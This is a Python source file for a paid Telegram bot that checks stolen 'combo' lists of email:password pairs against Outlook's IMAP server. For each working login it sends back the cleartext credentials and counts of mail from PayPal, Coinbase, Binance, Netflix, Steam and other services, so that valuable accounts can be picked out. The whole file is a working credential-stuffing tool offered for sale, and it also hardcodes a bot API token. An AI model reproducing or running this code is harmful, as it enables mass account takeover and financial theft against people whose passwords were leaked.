import os
import telebot
import imaplib
import json
import email
import random
import string
from email.header import decode_header
from datetime import datetime, timedelta
import time
from threading import Thread
import logging

# Set up logging
logging.basicConfig(filename='bot.log', level=logging.INFO, 
                    format='%(asctime)s %(levelname)s:%(message)s')

# Hide API Token and Admin IDs by fetching them from environment variables
API_TOKEN = os.getenv('7204851271:AAF7o3v4hlHOY1eE0_5bvog_Vu6OUQNIEy0', '7204851271:AAF7o3v4hlHOY1eE0_5bvog_Vu6OUQNIEy0')  # Correctly fetch the API token
Admin = os.getenv('ADMINS', '6652287427,6431874600').split(',')
BOT_USERNAME = '@kilteshotmailbot'

bot = telebot.TeleBot(API_TOKEN)

# Load subscribers from file
def load_subscribers():
    try:
        with open('hotmail.json', 'r') as file:
            data = json.load(file)
            return {subscriber['id']: subscriber['expiry_date'] for subscriber in data['subscribers']}
    except Exception as e:
        logging.error(f"Error loading subscribers: {e}")
        return {}

subscribers = load_subscribers()
redeem_codes = {}

def save_subscribers(subscribers_dict):
    try:
        with open('hotmail.json', 'w') as file:
            subscribers_list = [{'id': k, 'expiry_date': v} for k, v in subscribers_dict.items()]
            json.dump({'subscribers': subscribers_list}, file, indent=4)
    except Exception as e:
        logging.error(f"Error saving subscribers: {e}")

@bot.message_handler(commands=["start"])
def start(message):
    chat_id = str(message.chat.id)
    if chat_id not in subscribers:
        bot.reply_to(message, "Hey! This bot is not free. Ask @kiltes to get access.")
        return
    
    expiry_date_str = subscribers[chat_id]
    expiry_date = datetime.strptime(expiry_date_str, '%Y-%m-%d')
    current_date = datetime.now()
    
    if current_date > expiry_date:
        bot.reply_to(message, "Sorry, your premium subscription has expired.")
    else:
        bot.reply_to(message, "Drop a combo here and let me do magic ðŸª„. Do /cmds to view available commands")

# Command to generate redeem codes (Admin only)
@bot.message_handler(commands=['code'])
def generate_code(message):
    if str(message.chat.id) not in Admin:
        bot.reply_to(message, "You are not authorized to use this command.")
        return

    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "Please provide the number of days for the code validity.")
        return

    days = int(args[1])
    expiry_date = (datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d')
    
    # Generate a random code
    random_string = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    code = f"kiltes-hotmail-{random_string}"
    redeem_codes[code] = expiry_date

    admin_username = message.from_user.username

    bot.reply_to(message, f"""
Code generated: {code}
Validity: {days} days
Bot: {BOT_USERNAME}
Generated by: @{admin_username}

Usage:
/redeem {code}
""")

# Command to redeem codes
@bot.message_handler(commands=['redeem'])
def redeem_code(message):
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "Please provide a redeem code.")
        return

    code = args[1]
    chat_id = str(message.chat.id)

    if code in redeem_codes:
        subscribers[chat_id] = redeem_codes[code]
        save_subscribers(subscribers)
        del redeem_codes[code]
        bot.reply_to(message, f"Redeem code applied successfully! You now have access until {subscribers[chat_id]}.")
    else:
        bot.reply_to(message, "Invalid redeem code.")

# Command to show all available commands
@bot.message_handler(commands=['cmds'])
def list_commands(message):
    commands = """
    /start - Start the bot
    /chk <email:password> - Check inbox
    /subscribers - List all subscribers (Admin only)
    /kick <id> - Remove a subscriber (Admin only)
    /allow <id> <days> - Allow a new subscriber (Admin only)
    /code <days> - Generate a redeem code (Admin only)
    /redeem <code> - Redeem a code for bot access
    /adm <id> - Add a new admin (Admin only)
    /dms <id> - Remove an admin (Admin only)
    """
    bot.reply_to(message, commands)

# Command to add a new admin (Admin only)
@bot.message_handler(commands=['adm'])
def add_admin(message):
    if str(message.chat.id) not in Admin:
        bot.reply_to(message, "You are not authorized to use this command.")
        return

    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "Please provide a user ID to add as admin.")
        return

    new_admin_id = args[1]
    Admin.append(new_admin_id)
    bot.reply_to(message, f"User {new_admin_id} has been added as an admin.")

# Command to remove an admin (Admin only)
@bot.message_handler(commands=['dms'])
def delete_admin(message):
    if str(message.chat.id) not in Admin:
        bot.reply_to(message, "You are not authorized to use this command.")
        return

    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "Please provide a user ID to remove as admin.")
        return

    admin_id_to_remove = args[1]
    if admin_id_to_remove in Admin:
        Admin.remove(admin_id_to_remove)
        bot.reply_to(message, f"User {admin_id_to_remove} has been removed as an admin.")
    else:
        bot.reply_to(message, "Admin ID not found.")

# Existing command handlers

def check_login(email, password):
    try:
        mail = imaplib.IMAP4_SSL('imap-mail.outlook.com')
        mail.login(email, password)
        mail.logout()
        return True
    except imaplib.IMAP4.error:
        logging.warning(f"Failed login attempt for {email}")
        return False

def check_inbox_count(email_address, password):
    try:
        mail = imaplib.IMAP4_SSL("imap-mail.outlook.com")
        mail.login(email_address, password)
        mail.select("inbox")

        senders = {
            "Instagram": "security@mail.instagram.com",
            "Netflix": "info@account.netflix.com",
            "Spotify": "no-reply@spotify.com",
            "PayPal": "service@paypal.com",
            "Amazon": "account-update@amazon.com",
            "Steam": "noreply@steampowered.com",
            "Facebook": "security@facebookmail.com",
            "Coinbase": "no-reply@coinbase.com",
            "Binance": "do_not_reply@mgdirectmail.binance.com",
            "Supercell": "noreply@id.supercell.com",
            "Rockstar": "noreply@rockstargames.com",  "Valorant":  "noreply@mail.accounts.riotgames.com"
        }

        counts = {}
        for service, sender in senders.items():
            status, messages = mail.search(None, f'FROM "{sender}"')
            if status == "OK":
                email_ids = messages[0].split()
                counts[service] = len(email_ids)
            else:
                counts[service] = 0

        mail.logout()
        return counts

    except Exception as e:
        logging.error(f"Error checking inbox for {email_address}: {e}")  # Corrected error message
        return str(e)

def process_document(chat_id, file_content):
    start_time = time.time()
    total_lines = len(file_content)
    successful_logins = []
    failed_logins = 0

    for i, line in enumerate(file_content):
        try:
            email, password = line.split(':')
            if check_login(email, password):
                result = check_inbox_count(email, password)
                if isinstance(result, dict):
                    response = "\n".join([f"{service}: {count} emails" for service, count in result.items()])
                    bot.send_message(chat_id, f"Hotmail Hit\nâž­ {email}:{password}\nINBOX\n{response}\nBot by: @newlester")
                else:
                    bot.send_message(chat_id, f"Hotmail Hit\nStatus: Logged In\nCredentials: {email}:{password}\nBot by: @newlester\nError: {result}")
                successful_logins.append(email)
            else:
                failed_logins += 1
        except ValueError:
            failed_logins += 1

        if i % 50 == 0:
            current_time = time.time()
            time_taken = current_time - start_time
            result_message = f"Progress...\nTotal Lines = {total_lines}\nProcessed = {i+1}\nHits = {len(successful_logins)}\nFailed = {failed_logins}\nTime Taken = {time_taken:.2f}s"
            bot.send_message(chat_id, result_message)

    end_time = time.time()
    time_taken = end_time - start_time

    final_result_message = f"Results Captured\nTotal Lines = {total_lines}\nHits = {len(successful_logins)}\nFailed = {failed_logins}\nTime Taken = {time_taken:.2f}s\nBot by: @newlester"
    bot.send_message(chat_id, final_result_message)

@bot.message_handler(content_types=['document'])
def handle_document(message):
    if str(message.chat.id) not in subscribers:
        return

    checking_message = bot.reply_to(message, "Pending... Please wait, it may take time. I will inform you when completed.")

    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    file_content = downloaded_file.decode('utf-8').strip().split('\n')

    if not file_content:  # Check for empty file
        bot.send_message(message.chat.id, "The uploaded file is empty.")
        return

    thread = Thread(target=process_document, args=(message.chat.id, file_content))
    thread.start()

@bot.message_handler(commands=['chk'])
def check_inbox(message):
    try:
        email_password = message.text.split()[1]
        email_address, password = email_password.split(':')

        result = check_inbox_count(email_address, password)

        if isinstance(result, dict):
            response = "\n".join([f"{service}: {count} emails" for service, count in result.items()])
            bot.reply_to(message, response)
        else:
            bot.reply_to(message, f"Error: {result}")

    except IndexError:
        bot.reply_to(message, "Usage: /chk email:password")
    except ValueError:
        bot.reply_to(message, "Invalid format. Use /chk email:password")
    except Exception as e:
        logging.error(f"Error in /chk command: {e}")
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(commands=['subscribers'])
def send_subscribers(message):
    if str(message.chat.id) not in Admin:
        bot.send_message(message.chat.id, "You are not authorized to use this command.")
        return

    response = "\n".join([f"ID: {subscriber_id} - Expiry Date: {expiry_date}" for subscriber_id, expiry_date in subscribers.items()])
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['kick'])
def kick_subscriber(message):
    if str(message.chat.id) not in Admin:
        bot.send_message(message.chat.id, "You are not authorized to use this command.")
        return

    args = message.text.split()
    if len(args) < 2:
        bot.send_message(message.chat.id, "Please provide a subscriber ID to kick.")
        return

    subscriber_id_to_kick = args[1]
    if subscriber_id_to_kick in subscribers:
        del subscribers[subscriber_id_to_kick]
        save_subscribers(subscribers)
        bot.send_message(message.chat.id, f"Subscriber {subscriber_id_to_kick} has been removed.")
    else:
        bot.send_message(message.chat.id, "Subscriber ID not found.")

@bot.message_handler(commands=['allow'])
def allow_subscriber(message):
    if str(message.chat.id) not in Admin:
        bot.send_message(message.chat.id, "You are not authorized to use this command.")
        return

    args = message.text.split()
    if len(args) < 3:
        bot.send_message(message.chat.id, "Please provide a subscriber ID and number of days.")
        return

    new_id, days = args[1], int(args[2])
    expiry_date = (datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d')
    subscribers[new_id] = expiry_date
    save_subscribers(subscribers)
    bot.send_message(message.chat.id, f"Subscriber {new_id} added with expiry on {expiry_date}.")

bot.infinity_polling()